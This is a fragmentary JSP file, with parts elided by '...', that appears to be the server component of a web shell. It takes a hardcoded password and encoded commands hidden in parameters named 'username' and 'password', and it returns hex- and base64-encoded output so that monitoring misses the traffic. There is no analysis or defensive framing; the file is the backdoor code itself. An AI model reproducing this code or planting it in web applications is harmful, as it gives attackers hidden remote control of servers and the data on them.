<%@page
	import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,sun.misc.*"%>
<%!
	String Pwd = "test";
	String cs = "UTF-8";
	...
	static String toHexString(String hint) {
		String str = "";
	...
	String toStringHex(String s) {
		...
		try {
			s = new String(baKeyword, cs);// UTF-16le:Not
		} catch (Exception e1) {
			e1.printStackTrace();
		}
		return s;
...
<%
	...
	try {
		String[] aa = getFromBase64(toStringHex(request.getParameter("username")))
				.split("&");
		String Z = "";
		String z1 = "";
		String z2 = "";
		...
		for (int i = 0; i < aa.length; i++) {
			if (aa[i].indexOf("z1=") >= 0) {
				z1 = EC(aa[i].split("=")[1] + "");
			}
			if (aa[i].indexOf(Pwd + "=") >= 0) {
				Z = EC(aa[i].split("=")[1] + "");
			}
			if (aa[i].indexOf("z0=") >= 0) {
					cs = aa[i].split("=")[1] != null ? aa[i].split("=")[1] + "" : cs;
			}

		}
		z2 = EC(getFromBase64(toStringHex(request.getParameter("password"))) + "");
		/*out.println("z1="+z1);
		out.println("z2="+z2);
		out.println("cs="+cs);
		out.println("Z="+Z);*/
	...
	sb.append("|" + "<-");
	out.println(toHexString(getBase64(sb.toString())));
